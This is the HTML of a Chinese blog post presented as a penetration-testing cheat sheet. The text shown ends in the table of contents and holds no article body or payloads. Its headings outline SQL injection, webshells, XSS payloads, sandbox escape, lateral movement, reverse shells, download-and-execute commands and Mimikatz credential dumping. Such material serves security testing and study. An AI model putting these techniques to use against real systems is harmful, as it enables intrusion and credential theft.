<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5"><title>渗透测试备忘录 | Linkle'Blog</title><meta name="description" content="渗透测试备忘录"><meta name="keywords" content="渗透测试"><meta name="author" content="Linkle"><meta name="copyright" content="Linkle"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin><meta name="twitter:card" content="summary"><meta name="twitter:title" content="渗透测试备忘录"><meta name="twitter:description" content="渗透测试备忘录"><meta name="twitter:image" content="http://pic.linkle.top/img/linkle/20210403133452.png"><meta property="og:type" content="article"><meta property="og:title" content="渗透测试备忘录"><meta property="og:url" content="https://blog.linkle.top/2021/04/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%A4%87%E5%BF%98%E5%BD%95/"><meta property="og:site_name" content="Linkle'Blog"><meta property="og:description" content="渗透测试备忘录"><meta property="og:image" content="http://pic.linkle.top/img/linkle/20210403133452.png"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><script>const autoChangeMode = 'false'
var t = Cookies.get("theme");
if (autoChangeMode == '1'){
const isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches
const isLightMode = window.matchMedia("(prefers-color-scheme: light)").matches
const isNotSpecified = window.matchMedia("(prefers-color-scheme: no-preference)").matches
const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

if (t === undefined){
  if (isLightMode) activateLightMode()
  else if (isDarkMode) activateDarkMode()
  else if (isNotSpecified || hasNoSupport){
    console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
    now = new Date();
    hour = now.getHours();
    isNight = hour < 6 || hour >= 18
    isNight ? activateDarkMode() : activateLightMode()
}
} else if (t == 'light') activateLightMode()
else activateDarkMode()


} else if (autoChangeMode == '2'){
  now = new Date();
  hour = now.getHours();
  isNight = hour < 6 || hour >= 18
  if(t === undefined) isNight? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode() 
} else {
  if ( t == 'dark' ) activateDarkMode()
  else if ( t == 'light') activateLightMode()
}

function activateDarkMode(){
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null){
    document.querySelector('meta[name="theme-color"]').setAttribute('content','#000')
  }
}
function activateLightMode(){
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null){
  document.querySelector('meta[name="theme-color"]').setAttribute('content','#fff')
  }
}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css"><link rel="canonical" href="https://blog.linkle.top/2021/04/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%A4%87%E5%BF%98%E5%BD%95/"><link rel="next" title="从零开始制作简易IDS-Part1" href="https://blog.linkle.top/2021/03/26/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%B6%E4%BD%9C%E7%AE%80%E6%98%93IDS-Part1/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"https://blog.linkle.top/","msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  bookmark: {
    title: 'Snackbar.bookmark.title',
    message_prev: '按',
    message_next: '键将本页加入书签'
  },
  runtime_unit: '天',
  runtime: true,
  copyright: undefined,
  ClickShowText: {"text":"富强,民主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善","fontSize":"15px"},
  medium_zoom: false,
  fancybox: true,
  Snackbar: {"bookmark":{"title":"Snackbar.bookmark.title","message_prev":"按","message_next":"键将本页加入书签"},"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#2d3035","position":"bottom-left"},
  baiduPush: false,
  isHome: false,
  isPost: true
  
}</script><meta name="generator" content="Hexo 4.2.1"></head><body><header> <div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/">Linkle'Blog</a></span><span class="toggle-menu pull_right close"><a class="site-page"><i class="fa fa-bars fa-fw" aria-hidden="true"></i></a></span><span class="pull_right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于</span></a></div></div></span></div></header><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="http://pic.linkle.top/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">9</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">18</div></a></div></div></div><hr><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于</span></a></div></div></div><div id="mobile-sidebar-toc"><div class="toc_mobile_headline">目录</div><div class="sidebar-toc__content"><ol class="toc_mobile_items"><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#Web"><span class="toc_mobile_items-number">1.</span> <span class="toc_mobile_items-text">Web</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#SQL-Inject"><span class="toc_mobile_items-number">1.1.</span> <span class="toc_mobile_items-text">SQL Inject</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#联合查询爆显示位"><span class="toc_mobile_items-number">1.1.1.</span> <span class="toc_mobile_items-text">联合查询爆显示位</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#联合查询爆表名"><span class="toc_mobile_items-number">1.1.2.</span> <span class="toc_mobile_items-text">联合查询爆表名</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#联合查询爆字段名"><span class="toc_mobile_items-number">1.1.3.</span> <span class="toc_mobile_items-text">联合查询爆字段名</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#联合查询爆字段值"><span class="toc_mobile_items-number">1.1.4.</span> <span class="toc_mobile_items-text">联合查询爆字段值</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#万能密码"><span class="toc_mobile_items-number">1.1.5.</span> <span class="toc_mobile_items-text">万能密码</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#布尔盲注测试"><span class="toc_mobile_items-number">1.1.6.</span> <span class="toc_mobile_items-text">布尔盲注测试</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#时间盲注测试"><span class="toc_mobile_items-number">1.1.7.</span> <span class="toc_mobile_items-text">时间盲注测试</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#floor报错注入"><span class="toc_mobile_items-number">1.1.8.</span> <span class="toc_mobile_items-text">floor报错注入</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#extractvalue报错注入"><span class="toc_mobile_items-number">1.1.9.</span> <span class="toc_mobile_items-text">extractvalue报错注入</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#info-outfile写文件"><span class="toc_mobile_items-number">1.1.10.</span> <span class="toc_mobile_items-text">info outfile写文件</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#load-file-读文件"><span class="toc_mobile_items-number">1.1.11.</span> <span class="toc_mobile_items-text">load_file 读文件</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#access"><span class="toc_mobile_items-number">1.1.12.</span> <span class="toc_mobile_items-text">access</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#mssql"><span class="toc_mobile_items-number">1.1.13.</span> <span class="toc_mobile_items-text">mssql</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#oracle"><span class="toc_mobile_items-number">1.1.14.</span> <span class="toc_mobile_items-text">oracle</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#Bypass"><span class="toc_mobile_items-number">1.2.</span> <span class="toc_mobile_items-text">Bypass</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#大小写"><span class="toc_mobile_items-number">1.2.1.</span> <span class="toc_mobile_items-text">大小写</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#空格绕过"><span class="toc_mobile_items-number">1.2.2.</span> <span class="toc_mobile_items-text">空格绕过</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#内联注释"><span class="toc_mobile_items-number">1.2.3.</span> <span class="toc_mobile_items-text">内联注释</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#双写绕过"><span class="toc_mobile_items-number">1.2.4.</span> <span class="toc_mobile_items-text">双写绕过</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#编码绕过"><span class="toc_mobile_items-number">1.2.5.</span> <span class="toc_mobile_items-text">编码绕过</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#PHP伪协议"><span class="toc_mobile_items-number">1.3.</span> <span class="toc_mobile_items-text">PHP伪协议</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#php伪协议，以base64编码输出"><span class="toc_mobile_items-number">1.3.1.</span> <span class="toc_mobile_items-text">php伪协议，以base64编码输出</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#php伪协议，以base64编码写入"><span class="toc_mobile_items-number">1.3.2.</span> <span class="toc_mobile_items-text">php伪协议，以base64编码写入</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#data协议命令执行"><span class="toc_mobile_items-number">1.3.3.</span> <span class="toc_mobile_items-text">data协议命令执行</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#一句话木马"><span class="toc_mobile_items-number">1.4.</span> <span class="toc_mobile_items-text">一句话木马</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#php"><span class="toc_mobile_items-number">1.4.1.</span> <span class="toc_mobile_items-text">php</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#asp"><span class="toc_mobile_items-number">1.4.2.</span> <span class="toc_mobile_items-text">asp</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#aspx"><span class="toc_mobile_items-number">1.4.3.</span> <span class="toc_mobile_items-text">aspx</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#生成图片马"><span class="toc_mobile_items-number">1.4.4.</span> <span class="toc_mobile_items-text">生成图片马</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#XSS-Payload"><span class="toc_mobile_items-number">1.5.</span> <span class="toc_mobile_items-text">XSS Payload</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#Python沙箱逃逸"><span class="toc_mobile_items-number">1.6.</span> <span class="toc_mobile_items-text">Python沙箱逃逸</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#python2沙箱逃逸"><span class="toc_mobile_items-number">1.6.1.</span> <span class="toc_mobile_items-text">python2沙箱逃逸</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#python3沙箱逃逸"><span class="toc_mobile_items-number">1.6.2.</span> <span class="toc_mobile_items-text">python3沙箱逃逸</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#PHP命令执行"><span class="toc_mobile_items-number">1.7.</span> <span class="toc_mobile_items-text">PHP命令执行</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#PHP代码执行"><span class="toc_mobile_items-number">1.8.</span> <span class="toc_mobile_items-text">PHP代码执行</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#横向渗透"><span class="toc_mobile_items-number">2.</span> <span class="toc_mobile_items-text">横向渗透</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#WMIC"><span class="toc_mobile_items-number">2.0.1.</span> <span class="toc_mobile_items-text">WMIC</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#IPC-Schtasks"><span class="toc_mobile_items-number">2.0.2.</span> <span class="toc_mobile_items-text">IPC + Schtasks</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#IPC-AT"><span class="toc_mobile_items-number">2.0.3.</span> <span class="toc_mobile_items-text">IPC + AT</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#Smbexec"><span class="toc_mobile_items-number">2.0.4.</span> <span class="toc_mobile_items-text">Smbexec</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#Psexec"><span class="toc_mobile_items-number">2.0.5.</span> <span class="toc_mobile_items-text">Psexec</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#PTH"><span class="toc_mobile_items-number">2.0.6.</span> <span class="toc_mobile_items-text">PTH</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#Wmiexec"><span class="toc_mobile_items-number">2.0.7.</span> <span class="toc_mobile_items-text">Wmiexec</span></a></li></ol></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#渗透测试"><span class="toc_mobile_items-number">3.</span> <span class="toc_mobile_items-text">渗透测试</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#反弹shell"><span class="toc_mobile_items-number">3.1.</span> <span class="toc_mobile_items-text">反弹shell</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#Bash"><span class="toc_mobile_items-number">3.1.1.</span> <span class="toc_mobile_items-text">Bash</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#NC"><span class="toc_mobile_items-number">3.1.2.</span> <span class="toc_mobile_items-text">NC</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#PHP"><span class="toc_mobile_items-number">3.1.3.</span> <span class="toc_mobile_items-text">PHP</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#Telnet"><span class="toc_mobile_items-number">3.1.4.</span> <span class="toc_mobile_items-text">Telnet</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#crontab"><span class="toc_mobile_items-number">3.1.5.</span> <span class="toc_mobile_items-text">crontab</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#Socat"><span class="toc_mobile_items-number">3.1.6.</span> <span class="toc_mobile_items-text">Socat</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#获得伪终端"><span class="toc_mobile_items-number">3.1.7.</span> <span class="toc_mobile_items-text">获得伪终端</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#信息收集"><span class="toc_mobile_items-number">3.2.</span> <span class="toc_mobile_items-text">信息收集</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#文件传输"><span class="toc_mobile_items-number">3.3.</span> <span class="toc_mobile_items-text">文件传输</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#bitsadmin下载文件"><span class="toc_mobile_items-number">3.3.1.</span> <span class="toc_mobile_items-text">bitsadmin下载文件</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#certutil下载文件并执行"><span class="toc_mobile_items-number">3.3.2.</span> <span class="toc_mobile_items-text">certutil下载文件并执行</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#certutil清除缓存"><span class="toc_mobile_items-number">3.3.3.</span> <span class="toc_mobile_items-text">certutil清除缓存</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#powershell下载文件"><span class="toc_mobile_items-number">3.3.4.</span> <span class="toc_mobile_items-text">powershell下载文件</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#wget"><span class="toc_mobile_items-number">3.3.5.</span> <span class="toc_mobile_items-text">wget</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#curl"><span class="toc_mobile_items-number">3.3.6.</span> <span class="toc_mobile_items-text">curl</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#PHP-1"><span class="toc_mobile_items-number">3.3.7.</span> <span class="toc_mobile_items-text">PHP</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#Python"><span class="toc_mobile_items-number">3.3.8.</span> <span class="toc_mobile_items-text">Python</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#Ruby"><span class="toc_mobile_items-number">3.3.9.</span> <span class="toc_mobile_items-text">Ruby</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#Perl"><span class="toc_mobile_items-number">3.3.10.</span> <span class="toc_mobile_items-text">Perl</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#Powershell加载远程脚本"><span class="toc_mobile_items-number">3.3.11.</span> <span class="toc_mobile_items-text">Powershell加载远程脚本</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#工具"><span class="toc_mobile_items-number">3.4.</span> <span class="toc_mobile_items-text">工具</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#Mimikatz"><span class="toc_mobile_items-number">3.4.1.</span> <span class="toc_mobile_items-text">Mimikatz</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#启动mimikatz"><span class="toc_mobile_items-number">3.4.2.</span> <span class="toc_mobile_items-text">启动mimikatz</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#获取登录账号的明文密码和Hash值"><span class="toc_mobile_items-number">3.4.3.</span> <span class="toc_mobile_items-text">获取登录账号的明文密码和Hash值</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#备份注册表中的SYSTTEM-amp-SAM-hive"><span class="toc_mobile_items-number">3.4.4.</span> <span class="toc_mobile_items-text">备份注册表中的SYSTTEM &amp; SAM hive</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#mimikatz获取hashs"><span class="toc_mobile_items-number">3.4.5.</span> <span class="toc_mobile_items-text">mimikatz获取hashs</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#读取从lsass进程中保存文件里的明文密码"><span class="toc_mobile_items-number">3.4.6.</span> <span class="toc_mobile_items-text">读取从lsass进程中保存文件里的明文密码</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#NMAP"><span class="toc_mobile_items-number">3.5.</span> <span class="toc_mobile_items-text">NMAP</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#基础扫描"><span class="toc_mobile_items-number">3.5.1.</span> <span class="toc_mobile_items-text">基础扫描</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#存活主机探测"><span class="toc_mobile_items-number">3.5.2.</span> <span class="toc_mobile_items-text">存活主机探测</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#全端口扫描"><span class="toc_mobile_items-number">3.5.3.</span> <span class="toc_mobile_items-text">全端口扫描</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#系统扫描"><span class="toc_mobile_items-number">3.5.4.</span> <span class="toc_mobile_items-text">系统扫描</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#服务版本检测"><span class="toc_mobile_items-number">3.5.5.</span> <span class="toc_mobile_items-text">服务版本检测</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#waf识别"><span class="toc_mobile_items-number">3.5.6.</span> <span class="toc_mobile_items-text">waf识别</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#Msfvenom"><span class="toc_mobile_items-number">3.6.</span> <span class="toc_mobile_items-text">Msfvenom</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#Windows"><span class="toc_mobile_items-number">3.6.1.</span> <span class="toc_mobile_items-text">Windows</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#Linux"><span class="toc_mobile_items-number">3.6.2.</span> <span class="toc_mobile_items-text">Linux</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#Mac"><span class="toc_mobile_items-number">3.6.3.</span> <span class="toc_mobile_items-text">Mac</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#Bash-1"><span class="toc_mobile_items-number">3.6.4.</span> <span class="toc_mobile_items-text">Bash</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#PHP-2"><span class="toc_mobile_items-number">3.6.5.</span> <span class="toc_mobile_items-text">PHP</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#JSP"><span class="toc_mobile_items-number">3.6.6.</span> <span class="toc_mobile_items-text">JSP</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#WAR"><span class="toc_mobile_items-number">3.6.7.</span> <span class="toc_mobile_items-text">WAR</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#Python-1"><span class="toc_mobile_items-number">3.6.8.</span> <span class="toc_mobile_items-text">Python</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#Perl-1"><span class="toc_mobile_items-number">3.6.9.</span> <span class="toc_mobile_items-text">Perl</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#PowerShell"><span class="toc_mobile_items-number">3.6.10.</span> <span class="toc_mobile_items-text">PowerShell</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#Metasploit"><span class="toc_mobile_items-number">3.7.</span> <span class="toc_mobile_items-text">Metasploit</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#msfconsole"><span class="toc_mobile_items-number">3.7.1.</span> <span class="toc_mobile_items-text">msfconsole</span></a></li></ol></li></ol></li></ol></div></div></div><div id="body-wrap"><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true">     </i><div class="auto_open" id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-Inject"><span class="toc-number">1.1.</span> <span class="toc-text">SQL Inject</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#联合查询爆显示位"><span class="toc-number">1.1.1.</span> <span class="toc-text">联合查询爆显示位</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#联合查询爆表名"><span class="toc-number">1.1.2.</span> <span class="toc-text">联合查询爆表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#联合查询爆字段名"><span class="toc-number">1.1.3.</span> <span class="toc-text">联合查询爆字段名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#联合查询爆字段值"><span class="toc-number">1.1.4.</span> <span class="toc-text">联合查询爆字段值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#万能密码"><span class="toc-number">1.1.5.</span> <span class="toc-text">万能密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#布尔盲注测试"><span class="toc-number">1.1.6.</span> <span class="toc-text">布尔盲注测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#时间盲注测试"><span class="toc-number">1.1.7.</span> <span class="toc-text">时间盲注测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#floor报错注入"><span class="toc-number">1.1.8.</span> <span class="toc-text">floor报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#extractvalue报错注入"><span class="toc-number">1.1.9.</span> <span class="toc-text">extractvalue报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#info-outfile写文件"><span class="toc-number">1.1.10.</span> <span class="toc-text">info outfile写文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#load-file-读文件"><span class="toc-number">1.1.11.</span> <span class="toc-text">load_file 读文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#access"><span class="toc-number">1.1.12.</span> <span class="toc-text">access</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mssql"><span class="toc-number">1.1.13.</span> <span class="toc-text">mssql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#oracle"><span class="toc-number">1.1.14.</span> <span class="toc-text">oracle</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass"><span class="toc-number">1.2.</span> <span class="toc-text">Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#大小写"><span class="toc-number">1.2.1.</span> <span class="toc-text">大小写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#空格绕过"><span class="toc-number">1.2.2.</span> <span class="toc-text">空格绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#内联注释"><span class="toc-number">1.2.3.</span> <span class="toc-text">内联注释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#双写绕过"><span class="toc-number">1.2.4.</span> <span class="toc-text">双写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#编码绕过"><span class="toc-number">1.2.5.</span> <span class="toc-text">编码绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP伪协议"><span class="toc-number">1.3.</span> <span class="toc-text">PHP伪协议</span></a><ol 